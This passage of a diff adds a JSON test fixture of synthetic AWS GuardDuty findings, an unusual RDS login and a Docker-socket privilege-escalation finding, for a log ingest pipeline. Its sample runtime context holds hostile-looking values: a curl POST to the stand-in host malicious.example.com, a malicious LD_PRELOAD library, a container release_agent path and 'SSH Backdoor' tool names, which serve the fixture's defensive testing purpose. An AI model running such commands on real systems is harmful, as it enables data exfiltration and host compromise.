t\":0,\"successfulLoginCount\":1,\"incompleteConnectionCount\":0},\"unusualASNClusterProfiling\":{\"asnOrg\":\"GeneratedFindingAsnOrg\",\"failedLoginCount\":0,\"successfulLoginCount\":10,\"incompleteConnectionCount\":0},\"unusualApplicationNameClusterProfiling\":{\"applicationName\":\"GeneratedFindingApplicationName\",\"failedLoginCount\":0,\"successfulLoginCount\":1,\"incompleteConnectionCount\":0},\"unusualDatabaseNameClusterProfiling\":{\"databaseName\":\"GeneratedFindingDatabaseName\",\"failedLoginCount\":0,\"successfulLoginCount\":1,\"incompleteConnectionCount\":0}},\"sample\":true,\"value\":\"{\\\"unusualBehavior\\\":{\\\"unusualUserNameClusterProfiling\\\":{\\\"userName\\\":\\\"PficnbsefEpzcmpzRybsRakc\\\",\\\"failedLoginCount\\\":0,\\\"successfulLoginCount\\\":1,\\\"incompleteConnectionCount\\\":0},\\\"unusualASNClusterProfiling\\\":{\\\"asnOrg\\\":\\\"GeneratedFindingAsnOrg\\\",\\\"failedLoginCount\\\":0,\\\"successfulLoginCount\\\":10,\\\"incompleteConnectionCount\\\":0},\\\"unusualApplicationNameClusterProfiling\\\":{\\\"applicationName\\\":\\\"GeneratedFindingApplicationName\\\",\\\"failedLoginCount\\\":0,\\\"successfulLoginCount\\\":1,\\\"incompleteConnectionCount\\\":0},\\\"unusualDatabaseNameClusterProfiling\\\":{\\\"databaseName\\\":\\\"GeneratedFindingDatabaseName\\\",\\\"failedLoginCount\\\":0,\\\"successfulLoginCount\\\":1,\\\"incompleteConnectionCount\\\":0}},\\\"sample\\\":true}\",\"type\":\"default\"},\"resourceRole\":\"TARGET\",\"evidence\":null,\"count\":1,\"detectorId\":\"4ec22961e1defabcdefabcdef2a1234\",\"eventFirstSeen\":\"2050-12-07T10:28:35.000Z\",\"eventLastSeen\":\"2050-12-07T10:28:35.000Z\",\"serviceName\":\"guardduty\",\"archived\":false},\"createdAt\":\"2050-12-07T10:28:35.948Z\",\"severity\":8,\"updatedAt\":\"2050-12-07T10:28:35.948Z\",\"title\":\"Unusual successful login by PficnbsefEpzcmpzRybsRakc observed on RDS instance GeneratedFindingDBInstanceId.\",\"description\":\"Unusual successful login by PficnbsefEpzcmpzRybsRakc observed on RDS instance GeneratedFindingDBInstanceId.\"}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "message": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123456789\",\"region\":\"us-west-1\",\"partition\":\"aws\",\"id\":\"abcd1234\",\"arn\":\"arn:aws:guardduty:us-west-1:abcd1234:detector/abcd1234/finding/abcd1234\",\"type\":\"PrivilegeEscalation:Runtime/DockerSocketAccessed\",\"resource\":{\"resourceType\":\"Container\",\"instanceDetails\":{\"instanceId\":\"i-abcd1234\",\"instanceType\":\"m2.large\",\"launchTime\":\"2052-07-29T17:58:17.000Z\",\"platform\":null,\"productCodes\":[],\"iamInstanceProfile\":{\"arn\":\"arn:aws:iam::abcd1234:instance-profile/buildserver_profile\",\"id\":\"AAAAAAAAAAAAAAAAAAA\"},\"networkInterfaces\":[{\"ipv6Addresses\":[],\"networkInterfaceId\":\"eni-abcd1234\",\"privateDnsName\":\"[tn-84-78-69-92.us](https://ip-10-30-30-15.us/)-west-1.compute.internal\",\"privateIpAddress\":\"10.198.37.234\",\"privateIpAddresses\":[{\"privateDnsName\":\"[tn-84-78-69-92.us](https://ip-10-30-30-15.us/)-west-1.compute.internal\",\"privateIpAddress\":\"10.198.37.234\"}],\"subnetId\":\"subnet-abcd1234\",\"vpcId\":\"vpc-abcd1234\",\"securityGroups\":[{\"groupName\":\"build\",\"groupId\":\"sg-abcd1234\"},{\"groupName\":\"main\",\"groupId\":\"sg-abcd1234\"}],\"publicDnsName\":\"[ec2-216.160.83.56.us-west-1.compute.amazonaws.com](https://ec2-198.51.100.124.us-west-1.compute.amazonaws.com/)\",\"publicIp\":\"198.51.100.124\"}],\"outpostArn\":null,\"tags\":[{\"key\":\"Name\",\"value\":\"buildserver-a-0\"},{\"key\":\"group\",\"value\":\"build-server\"}],\"instanceState\":\"running\",\"availabilityZone\":\"us-west-1b\",\"imageId\":\"ami-abcd1234\",\"imageDescription\":\"Ubuntu 20.04 AMI with Docker installed\"},\"containerDetails\":{\"containerRuntime\":\"docker\",\"id\":\"abcd1234\",\"name\":null,\"image\":\"[abcd1234.us-west-1.amazonaws.com/mirror/test/infrastructure-bundle:2.8.37](https://abcd1234.us-west-1.amazonaws.com/mirror/test/infrastructure-bundle:2.8.37)\",\"imageUid\":null,\"volumeMounts\":null,\"securityContext\":null,\"imagePrefix\":null}},\"service\":{\"serviceName\":\"guardduty\",\"featureName\":\"RuntimeMonitoring\",\"detectorId\":\"abcd1234\",\"action\":{},\"runtimeDetails\":{\"context\":{\"addressFamily\":\"AF_INET\",\"commandLineExample\":\"/usr/bin/curl -X POST http://malicious.example.com\",\"fileSystemType\":\"ext4\",\"flags\":[\"ro\"],\"ianaProtocolNumber\":6,\"ldPreloadValue\":\"/usr/lib/libmalicious.so\",\"libraryPath\":\"/usr/lib/libc.so.6\",\"memoryRegions\":[\"heap\",\"stack\"],\"modifiedAt\":\"2052-10-07T18:45:30Z\",\"modifyingProcess\":{\"name\":\"bash\",\"pid\":2451,\"user\":\"root\"},\"moduleFilePath\":\"/lib/modules/5.15.0-1023-generic/kernel/net/ipv4/netfilter/ipt_MAL.so\",\"moduleName\":\"ipt_MAL\",\"moduleSha256\":\"2e13db4b450d80841659cfde061e0cc9\",\"mountSource\":\"/dev/sda1\",\"mountTarget\":\"/mnt/data\",\"releaseAgentPath\":\"/mnt/container/release_agent\",\"runcBinaryPath\":\"/usr/sbin/runc\",\"scriptPath\":\"/usr/local/bin/malicious_script.sh\",\"serviceName\":\"firewalld\",\"shellHistoryFilePath\":\"/root/.bash_history\",\"socketPath\":\"/var/run/docker.sock\",\"targetProcess\":{\"name\":\"sshd\",\"pid\":3124,\"user\":\"admin\"},\"threatFilePath\":\"/tmp/malicious_file.bin\",\"toolCategory\":\"Backdoor Tool\",\"toolName\":\"SSH Backdoor\"},\"process\":{\"euid\":1000,\"executablePath\":\"/usr/bin/ssh\",\"executableSha256\":\"d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2\",\"lineage\":[{\"parentUuid\":\"f1f3e825-2698-40f8-8763-0e239dc4b2fe\",\"ancestorPid\":123,\"ancestorName\":\"sshd\"},{\"parentUuid\":\"d55f6d53-0d8c-4f57-b50d-9c6b83aeed04\",\"ancestorPid\":456,\"ancestorName\":\"apache2\"}],\"name\":\"sshd\",\"namespacePid\":456,\"parentUuid\":\"f1f3e825-2698-40f8-8763-0e239dc4b2fe\",\"pid\":2345,\"pwd\":\"/home/user\",\"startTime\":2611627590.3773646,\"user\":\"admin\",\"userId\":1000,\"uuid\":\"abc12345-def6-7890-ghij-klmnopqrstuv\"}},\"additionalInfo\":{\"value\":\"{}\",\"type\":\"default\"},\"eventFirstSeen\":\"2052-07-24T04:03:51.666Z\",\"eventLastSeen\":\"2052-10-04T04:06:30.383Z\",\"archived\":false,\"count\":9},\"severity\":5,\"createdAt\":\"2052-07-24T04:06:10.359Z\",\"updatedAt\":\"2052-10-04T04:09:13.066Z\",\"title\":\"A container is communicating with a docker socket.\",\"description\":\"A process is communicating with a docker socket using a unix socket.\"}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "message": "{\"findings\":[]}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    }
+  ],
+  "meta": {
+    "data_stream": "guardduty",
+    "dynamic_fields": {},
+    "elasticsearch_version": "9.2.2",
+    "entry_pipeline": "compat-aws-guardduty-default",
+    "event_count": 6,
+    "numeric_keyword_fields": [],
+    "package": "aws",
+    "pipelines_commit": "2c934eb5223bdfcf0ea0db9e3230154933352bda"
+  }
+}
